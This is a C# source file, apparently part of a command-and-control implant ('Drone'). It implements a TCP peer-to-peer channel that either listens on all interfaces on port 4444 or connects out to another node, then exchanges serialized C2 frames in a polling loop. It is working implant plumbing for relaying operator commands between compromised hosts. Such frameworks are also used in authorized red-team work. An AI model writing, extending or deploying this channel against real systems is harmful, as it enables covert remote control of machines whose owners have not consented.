using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.CommModules;

public sealed class TcpCommModule : P2PCommModule
{
    public override ModuleType Type => ModuleType.P2P;
    public override ModuleMode Mode { get; }
    public override bool Running { get; protected set; }

    public override event Func<C2Frame, Task> FrameReceived;
    public override event Action OnException;

    private CancellationTokenSource _tokenSource;

    private readonly string _connectAddress;
    private readonly int _connectPort;

    private TcpListener _listener;
    private TcpClient _client;

    public TcpCommModule()
    {
        Mode = ModuleMode.SERVER;
    }

    public TcpCommModule(string connectAddress, int connectPort)
    {
        _connectAddress = connectAddress;
        _connectPort = connectPort;
        
        Mode = ModuleMode.CLIENT;
    }
    
    public override void Init()
    {
        _tokenSource = new CancellationTokenSource();
        
        switch (Mode)
        {
            case ModuleMode.SERVER:
            {
                var address = Loopback ? IPAddress.Loopback : IPAddress.Any;
                _listener = new TcpListener(new IPEndPoint(address, BindPort));
                _listener.Start(100);
                
                break;
            }

            case ModuleMode.CLIENT:
            {
                _client = new TcpClient();

                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    public override async Task Start()
    {
        switch (Mode)
        {
            case ModuleMode.SERVER:
            {
                _client = await _listener.AcceptTcpClientAsync();
                break;
            }

            case ModuleMode.CLIENT:
            {
                await _client.ConnectAsync(_connectAddress, _connectPort);
                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
        
        Running = true;
    }

    public override async Task Run()
    {
        while (!_tokenSource.IsCancellationRequested)
        {
            if (_client.DataAvailable())
            {
                try
                {
                    var stream = _client.GetStream();
                    var data = await stream.ReadStream();
                    var frame = data.Deserialize<C2Frame>();

                    FrameReceived?.Invoke(frame);
                }
                catch
                {
                    OnException?.Invoke();
                    return;
                }
            }

            await Task.Delay(100);
        }
        
        _listener?.Stop();
        _client?.Dispose();
        _tokenSource.Dispose();
    }

    public override async Task SendFrame(C2Frame frame)
    {
        try
        {
            var data = frame.Serialize();
            var stream = _client.GetStream();
            await stream.WriteStream(data);
        }
        catch
        {
            OnException?.Invoke();
        }
    }

    public override void Stop()
    {
        _tokenSource.Cancel();
        Running = false;
    }

    private static bool Loopback => false;
    private static int BindPort => int.Parse("4444");
}